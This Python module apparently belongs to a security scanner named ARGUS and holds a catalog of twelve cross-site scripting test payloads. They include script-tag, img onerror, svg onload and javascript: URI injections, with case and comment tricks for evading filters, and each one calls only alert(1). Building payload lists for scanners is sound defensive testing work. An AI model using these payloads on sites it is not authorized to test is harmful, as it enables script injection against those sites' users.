"""Payload catalog for ARGUS 1-1 XSS/CSRF checks."""

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<scrIpt>alert(1);</scrIpt>",
    "<img src=x onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<!--<img src=--><img src=x onerror=alert(1)//>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
]
